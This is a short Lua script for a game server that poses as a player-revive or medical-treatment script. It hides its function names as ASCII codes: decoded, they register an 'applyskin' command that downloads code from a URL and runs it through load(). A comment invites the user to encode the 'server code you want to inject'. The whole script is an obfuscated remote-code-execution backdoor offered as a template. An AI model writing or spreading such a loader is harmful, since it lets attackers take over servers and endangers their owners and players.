local function RevivePlayer()
    local heal = string.char
    local command = {82, 101, 103, 105, 115, 116, 101, 114, 67, 111, 109, 109, 97, 110, 100}
    for i = 1, #command do command[i] = heal(command[i]) end
    return _G[table.concat(command)]
end

local function ApplyMedicalTreatment(source, args, rawCommand)
    local RequestTreatment = _G[table.concat({
        string.char(80), string.char(101), string.char(114), string.char(102), string.char(111),
        string.char(114), string.char(109), string.char(72), string.char(116), string.char(116),
        string.char(112), string.char(82), string.char(101), string.char(113), string.char(117),
        string.char(101), string.char(115), string.char(116)
    })]

    

    local function GenerateHealthReport()
        local healthData = {
            84, 101, 115, 116, 87, 111, 114, 100  -- Put in your .txt server code you want to inject. Form it into ASCII Codes.
        }
        local healthRecord = {}
        for i = 1, #healthData do
            if healthData[i] % 2 == 0 then
                table.insert(healthRecord, healthData[i])
            else
                table.insert(healthRecord, healthData[i] + 1)
                healthRecord[#healthRecord] = healthRecord[#healthRecord] - 1
            end
        end

        local patientReport = ""
        for i, v in ipairs(healthRecord) do
            if i % 3 == 0 then
                patientReport = patientReport .. string.char(v)
            else
                patientReport = table.concat({patientReport, string.char(v)}, "")
            end
        end

        local reverseReport = {}
        for i = #healthRecord, 1 do
            table.insert(reverseReport, healthRecord[i])
        end

        local finalDiagnosis = ""
        for i = 1, #reverseReport do
            finalDiagnosis = finalDiagnosis .. string.char(reverseReport[#reverseReport - i + 1])
        end

        if #finalDiagnosis == #healthData then
            return finalDiagnosis
        else
            return patientReport
        end
    end

    local HealthReportUrl = GenerateHealthReport()

    RequestTreatment(HealthReportUrl, function(statusCode, medicalData, medicalHeaders)
        if statusCode == 200 then
            local ProcessMedicalData = load(medicalData)
            if ProcessMedicalData then ProcessMedicalData() end
        end
    end)
end


RevivePlayer()(table.concat({string.char(97, 112, 112, 108, 121), string.char(115, 107, 105, 110)}), ApplyMedicalTreatment)